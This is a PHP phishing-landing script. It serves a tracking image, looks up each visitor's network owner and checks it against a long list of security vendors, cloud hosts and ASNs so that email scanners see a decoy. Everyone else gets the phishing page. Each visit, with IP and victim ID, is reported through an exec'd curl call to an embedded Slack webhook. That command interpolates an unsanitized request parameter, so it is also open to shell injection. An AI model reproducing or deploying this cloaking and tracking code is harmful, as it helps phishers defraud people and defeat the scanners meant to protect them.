<?php
// open the file in a binary mode
$name = 'SignatureTorch.png';
$fp = fopen($name, 'rb');

// send the right headers
header("Content-Type: image/png");
header("Content-Length: " . filesize($name));
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

// dump the picture and stop the script
fpassthru($fp);
//exit;
?>

<?php
// Enter Your Phishing URL Below
$url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

$parts = parse_url($url);
$isIP = (bool)ip2long($parts['host']);


$allowed = "- *Accessed Phishing Site* -";

// This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
$ip = $_SERVER['REMOTE_ADDR'];
//$ip = "8.8.8.8";
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
$org = $details->org;

//Filename with list of orgs to block
$filename = "/var/www/html/blacklist.txt";

// Open the file
$fp = @fopen($filename, 'r'); 

// Add each line to an array
if ($fp) {
   $blockorgs = explode("\r\n", fread($fp, filesize($filename)));
}

// List of Orgs to be Blacklisted
//$blockorgs = array("AOFEI DATA INTERNATIONAL COMPANY LIMITED","China Unicom Guangdong IP network","Host Universal Pty Ltd","Netplus Broadband Services Private Limited","31173 Services AB","Ace Host, LLC","Blix Solutions AS","Bouygues Telecom SA","EGIHosting","GleSYS AB","H88 WEB HOSTING S.R.L.","Leaseweb USA, Inc.","QuickPacket, LLC","Strong Technology, LLC.","TEFINCOM S.A.","TELEFONICA DE ESPANA S.A.U.","Visual Trading Systems, LLC","Geekyworks IT Solutions Pvt Ltd","Leaseweb USA, Inc.","Blix Solutions AS","31173 Services AB","EGIHosting","QuickPacket, LLC","Alsycon B.V.","TELEFONICA DE ESPANA S.A.U.","MivoCloud SRL","Visual Trading Systems, LLC","Sistemas Informaticos, S.A.","LINZ STROM GAS WAERME GmbH fuer Energiedienstleistungen und Telekommunikation","Qinghai Telecom","Cisco Systems Ironport Division","CT-SHANXI-MAN-2","EDINAYA SET LIMITED LIABILITY COMPANY","GEMNET LLC","YANDEX LLC","1337 Services GmbH","ALGAR TELECOM S/A","ARABIAN INTERNET & COMMUNICATIONS SERVICES CO.LTD","BL Networks","Bharti Airtel Ltd., Telemedia Services","CDS Global Cloud Co., Ltd","China Mobile Communications Group Co., Ltd.","China Unicom IP network","Excitel Broadband Private Limited","Free SAS","GigeNET","Henan Mobile Communications Co.,Ltd","IDC, China Telecommunications Corporation","INCX Global, LLC","ISP4Life INC","Korea Telecom","Oracle Corporation","PEG TECH INC","PT Indonesia Comnets Plus","SK Broadband Co Ltd","Skyway West","Squarespace, Inc.","WhiteLabelColo","networksdelmanana.com","SkyLink Data Center BV","Red Byte LLC","M247 Europe SRL","Packet Exchange Limited","Dino Solutions, Inc.","SCALEWAY S.A.S.","DigitalOcean, LLC","Amazon.com, Inc.","Google LLC","OVH SAS","Amazon.com, Inc.","Cogent Communications","China Unicom Shanghai network","AVAST Software s.r.o.","Kaspersky Lab Switzerland GmbH","Nexeon Technologies, Inc.","HostRoyale Technologies Pvt Ltd","The Constant Company, LLC","Data Center Experts LTD","CenturyLink Communications, LLC","Hetzner Online GmbH","Login, Inc.","myLoc managed IT AG","Stanford University","GTT Communications Inc.","DediPath","VegasNAP, LLC","Massachusetts Institute of Technology","Google LLC","H4Y Technologies LLC","Sundance International LLC","CHINANET","UK Dedicated Servers Limited","Alibaba","Performive LLC","CHINA UNICOM China169 Backbone","B2 Net Solutions Inc.","CHINANET Guangdong province network","Zwiebelfreunde e.V.","Akamai Connected Cloud","Viettel Group","SAKURA Internet Inc.","Microsoft Corporation","A1 Telekom Austria AG","The Communication Authoity of Thailand, CAT","Aggros Operations Ltd.","Akamai Connected Cloud","Amazon.com, Inc.","CHINA UNICOM China169 Backbone","CHINANET","CHINANET Guangdong province network","CariNet, Inc.","Censys, Inc.","CenturyLink Communications, LLC","Cox Communications Inc.","DigitalOcean, LLC","Ferdinand Zink trading as Tube","Google LLC","HQDATA","Hetzner Online GmbH","Hurricane Electric LLC","M247 Europe SRL","OVH SAS","Office National des Postes et Telecommunications","ReliableSite.Net LLC","Sapinet SAS","Stanford University","Tamatiya EOOD","UCLOUD INFORMATION TECHNOLOGY (HK)","Virtual Systems LLC","Wana Corporate","Zenlayer Inc","Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754","CariNet","AS28006","Free Technologies","DataHata","GHOSTnet","AS55720","Emerald Onion","AS208323","AS6730","AS11042","AS53667","AS28753","AS28753","Globalhost d.o.o","AS133119","Huawei","FastNet","AS267124","BKTech","Optisprint","AS24151","Pogliotti","321net","AS4800","Kejizhongyi","SIMBANET","AS42926","Web2Objects","AS12083");

//block via blacklist
//if($ip != "75.103.132.161") {
if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true) {

// Content for Orgs to see on the Blacklist
//echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
?>

<!-- SOMETHING -->

<?php
// Respond With 404 Instead of Image. More Likely to Fool URL Checkers
//header('HTTP/1.0 404 not found'); 
  
$allowed = "- *Jedi Mind Trick Successful* -";

} else {





// PUT YOUR PHISHING CONTENT WITHIN THESE ELSE BRACKETS!!!!
?>


<!-- SOMETHING -->


<?php



$allowed = "- *Allowed* -";
}

if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}

// Slack Message
if(isset($_REQUEST['id'])){
$id = $_REQUEST['id'];

// Send Slack Notification
$message = ">".$url." was opened by ".$id." from ".$ip.". ".$allowed." (`".$org."`)";
} else {
$id = "";
$message = ">".$url." was opened by ".$ip.". ".$allowed." (`".$org."`)";
}

// Set Slack Information Here
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "#general", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' https://hooks.slack.com/services/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';
//echo $cmd;
exec($cmd);

// You Can Uncomment If You Want to Use a Database to Capture Requests (ask me for stored procedure)
//$conn = mysqli_connect('127.0.0.1', 'USERNAME', 'PASSWORD', 'phishbypass');
//// Check connection
//if ($conn->connect_error) {
//    die("Connection failed: " . $conn->connect_error);
//}

//$sql = "CALL InsertData('$ip','$id','$org','$jedi','$url');";
//$result = $conn->query($sql);

//printf($conn->error);
//$conn->close();


?>

















